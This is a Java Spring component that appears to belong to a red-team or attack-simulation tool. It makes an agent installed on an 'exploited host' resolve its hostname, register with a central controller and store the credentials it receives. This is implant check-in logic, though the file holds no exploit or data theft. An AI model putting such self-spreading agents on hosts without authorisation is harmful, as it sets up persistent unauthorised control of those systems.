package com.spulido.agent.bootstrap;

import java.net.InetAddress;
import java.util.concurrent.TimeUnit;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.ApplicationArguments;
import org.springframework.boot.ApplicationRunner;
import org.springframework.stereotype.Component;

import com.spulido.agent.config.AgentConfig;
import com.spulido.agent.worker.http.AgentHttpClient;
import com.spulido.agent.worker.http.dto.RegisterReplicatedResponse;

/**
 * Boot-time self-registration for agents installed on an exploited host with no Target ID.
 *
 * <p>When the agent was installed via the replication flow it has a preauth code but no
 * agent id / api key. In that case it resolves its own hostname and registers with Central,
 * which creates a new target from that hostname and returns credentials this agent stores
 * for subsequent authenticated communication. Standard installs (agent id + api key baked in)
 * skip this entirely.
 */
@Component
public class ReplicatedAgentRegistrar implements ApplicationRunner {

    private static final Logger log = LoggerFactory.getLogger(ReplicatedAgentRegistrar.class);
    private static final int MAX_ATTEMPTS = 5;

    private final AgentConfig config;
    private final AgentHttpClient httpClient;

    public ReplicatedAgentRegistrar(AgentConfig config, AgentHttpClient httpClient) {
        this.config = config;
        this.httpClient = httpClient;
    }

    @Override
    public void run(ApplicationArguments args) {
        if (!shouldSelfRegister()) {
            log.debug("Agent already provisioned or no preauth code present; skipping self-registration");
            return;
        }

        String hostname = resolveHostname();
        log.info("Exploited-agent install detected; self-registering with hostname '{}'", hostname);

        for (int attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
            try {
                RegisterReplicatedResponse response = httpClient.registerReplicated(hostname, "LINUX");
                if (response != null && response.getAgentId() != null && response.getApiKey() != null) {
                    config.setAgentId(response.getAgentId());
                    config.setApiKey(response.getApiKey());
                    log.info("Self-registered as replicated agent {} (target {})",
                            response.getAgentId(), response.getTargetId());
                    return;
                }
                log.warn("Self-registration returned no credentials (attempt {}/{})", attempt, MAX_ATTEMPTS);
            } catch (Exception e) {
                log.warn("Self-registration attempt {}/{} failed: {}", attempt, MAX_ATTEMPTS, e.getMessage());
            }
            if (attempt < MAX_ATTEMPTS && !backoff(attempt)) {
                break;
            }
        }

        log.error("Exhausted self-registration attempts; agent remains unauthenticated until Central is reachable");
    }

    private boolean shouldSelfRegister() {
        return isBlank(config.getAgentId()) && isBlank(config.getApiKey()) && !isBlank(config.getPreauthCode());
    }

    /**
     * Resolves the host's own name, trying the JVM lookup, then the HOSTNAME environment
     * variable, then the {@code hostname} command. Returns an empty string when none succeed
     * (Central then falls back to the client IP for the target name).
     */
    private String resolveHostname() {
        try {
            String jvmName = InetAddress.getLocalHost().getHostName();
            if (!isBlank(jvmName)) {
                return jvmName.trim();
            }
        } catch (Exception e) {
            log.debug("InetAddress hostname lookup failed: {}", e.getMessage());
        }

        String envName = System.getenv("HOSTNAME");
        if (!isBlank(envName)) {
            return envName.trim();
        }

        try {
            Process process = new ProcessBuilder("hostname").redirectErrorStream(true).start();
            String output = new String(process.getInputStream().readAllBytes()).trim();
            process.waitFor(3, TimeUnit.SECONDS);
            if (!isBlank(output)) {
                return output;
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        } catch (Exception e) {
            log.debug("hostname command failed: {}", e.getMessage());
        }

        return "";
    }

    // Overridable so tests can exercise the retry loop without real sleeps.
    protected boolean backoff(int attempt) {
        try {
            Thread.sleep(Math.min(attempt * 2000L, 10000L));
            return true;
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return false;
        }
    }

    private boolean isBlank(String value) {
        return value == null || value.isBlank();
    }
}
